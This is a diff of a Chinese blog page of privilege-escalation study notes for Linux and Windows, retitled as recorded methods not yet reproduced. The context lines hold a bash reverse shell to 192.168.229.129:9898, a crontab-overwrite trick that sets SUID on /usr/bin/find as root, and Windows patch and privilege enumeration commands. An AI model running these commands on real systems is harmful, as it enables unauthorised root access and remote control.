@@ -18,7 +18,7 @@
   <meta name="author" content="一叶枯舟">
   <meta name="keywords" content="">
   
-  <title>linux/Windows提权学习 - 一叶枯舟</title>
+  <title>linux/Windows提权(方法以及命令记录/未复现) - 一叶枯舟</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
 
@@ -163,7 +163,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="linux/Windows提权学习">
+            <span class="h2" id="subtitle" title="linux/Windows提权(方法以及命令记录/未复现)">
               
             </span>
 
@@ -225,7 +225,7 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">linux/Windows提权学习</h1>
+            <h1 style="display: none">linux/Windows提权(方法以及命令记录/未复现)</h1>
             
             <div class="markdown-body">
               <h1 id="提权"><a class="markdownIt-Anchor" href="#提权"></a> 提权</h1>
@@ -249,7 +249,7 @@
 <h3 id="15-计划任务提权"><a class="markdownIt-Anchor" href="#15-计划任务提权"></a> 1.5 计划任务提权</h3>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs awk">计划任务存放位置：<br><span class="hljs-regexp">/var/</span>spool/cron<br><span class="hljs-regexp">/etc/</span>crontab<br><span class="hljs-regexp">/etc/</span>cron.d<br><br><br>环境变量提权<br>cat <span class="hljs-regexp">/etc/</span>crontab<br><br>bash -i &gt;&amp; <span class="hljs-regexp">/dev/</span>tcp<span class="hljs-regexp">/192.168.229.129/</span><span class="hljs-number">9898</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br><br><br><br><br><br>Crontab文件重写提权<br><br><span class="hljs-number">1</span>、创建垃圾文件<br>echo “testtesttest1” &gt; <span class="hljs-number">1</span>.txt<br>echo “testtesttest2” &gt; <span class="hljs-number">2</span>.txt<br><br><span class="hljs-number">2</span>、编写删除垃圾文件脚本<br><span class="hljs-comment">#!/usr/bin/env python</span><br>import os<br>import sys<br>try:<br>    os.system(<span class="hljs-string">&#x27;rm -r /home/kali/testaaa/*&#x27;</span>)<br>except:<br>    sys.<span class="hljs-keyword">exit</span>()<br><br><span class="hljs-number">3</span>、计划任务中执行定时删除脚本<br>vim <span class="hljs-regexp">/etc/</span>crontab<br>*<span class="hljs-regexp">/1 * * * *	   root   python /</span>tmp/clear.py<br><br><span class="hljs-number">4</span>、修改批量执行脚本<br><span class="hljs-comment">#!/usr/bin/env python</span><br>import os<br>import sys<br>try:<br>    os.system(<span class="hljs-string">&#x27;chmod u+s /usr/bin/find&#x27;</span>)<br>except:<br>    sys.<span class="hljs-keyword">exit</span>()<br></code></pre></td></tr></table></figure>
 <h2 id="2-windows提权"><a class="markdownIt-Anchor" href="#2-windows提权"></a> 2、Windows提权</h2>
-<h3 id="21-基础信心收集"><a class="markdownIt-Anchor" href="#21-基础信心收集"></a> 2.1 基础信心收集</h3>
+<h3 id="21-基础信息收集"><a class="markdownIt-Anchor" href="#21-基础信息收集"></a> 2.1 基础信息收集</h3>
 <figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs stata">systeminfo    查询系统信息<br>systeminfo | findstr /B /C:“OS 名称” /C:“OS 版本“    查看systeminfo中特定的信息<br>Hostname     主机名<br><span class="hljs-keyword">Set</span>    环境变量<br><span class="hljs-keyword">Net</span> user   查看用户信息<br>Tasklist /svc   查询服务的pid号<br>wmic os get caption    查看系统名<br>wmic qfe get Description,HotFixID,InstalledOn    查看补丁信息<br>wmic qfe get Description,HotFixID,InstalledOn | findstr /C:<span class="hljs-string">&quot;KB4346084&quot;</span> /C:&quot;KB4509094“<br>wmic product get name,<span class="hljs-keyword">version</span>     查看当前安装程序<br>whoami /priv	当前帐户权限 	<br>ipconfig /displaydns	显示DNS缓存		<br>route <span class="hljs-keyword">print</span>	打印出路由表<br><span class="hljs-keyword">net</span> user UserName	关于用户的信息<br><span class="hljs-keyword">net</span> localgroup GROUP	关于指定组的信息<br>netsh firewall show config	显示防火墙配置<br><span class="hljs-keyword">net</span> start	列出启动的服务<br><span class="hljs-keyword">sc</span> <span class="hljs-keyword">query</span>	列出所有服务<br><span class="hljs-keyword">sc</span> qc ServiceName	找到指定服务的路径<br>icacls “C:\Example”	列出文件权限<br></code></pre></td></tr></table></figure>
 <h3 id="22-内核漏洞提权"><a class="markdownIt-Anchor" href="#22-内核漏洞提权"></a> 2.2 内核漏洞提权</h3>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs 8">通过以下两条命令可快速查看本地系统补丁：<br><br>systeminfo | findstr “KB”<br><br>wmic qfe get Caption,Description,HotFixID,InstalledOn<br><br></code></pre></td></tr></table></figure>
